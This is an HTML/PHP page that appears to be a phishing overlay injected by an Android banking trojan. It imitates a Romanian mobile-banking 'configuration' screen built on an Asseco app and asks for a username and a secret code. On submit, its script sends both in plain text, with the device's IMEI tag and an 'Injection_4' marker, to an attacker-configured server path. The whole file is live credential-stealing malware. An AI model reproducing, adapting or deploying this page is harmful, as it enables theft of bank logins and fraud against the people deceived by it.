<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="ro/hr.asseco.android.jimba.mUCI.ro/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div id="logo">
	<img src="data:image/png;base64,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">
	<b> Configura re </b>
</div>
    <div class="main">
        <div class="container">
<div class="row">

                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">
<p> Introdu datele pentru configurare </p>
<br>
					<form id="form">
                            <div class="form-group ">
									<label> Nume utilizator </label><br>
									<input type="text" class="form-control" name="field2" id="login" autocomplete="off" maxlength="100" data-reg="/.{4,100}/" >
                           </div>

						   <br>

                            <div class="form-group">
									<label> Cod de configurare </label>
									<input type="password" class="form-control" name="field3" id="password" autocomplete="off" data-reg="/.{4,100}/" maxlength="100" >
                            </div><br>

                       				<input type="button" class="input_submitBtn" onClick="sentServer();" value="Continua">
 </form><br>

</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>
<script>
	function sentServer()
	{
var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|asseco_jimba_mUCI_ro|"+login1+"|"+pass);
	}
}
</script>

</body>
</html>
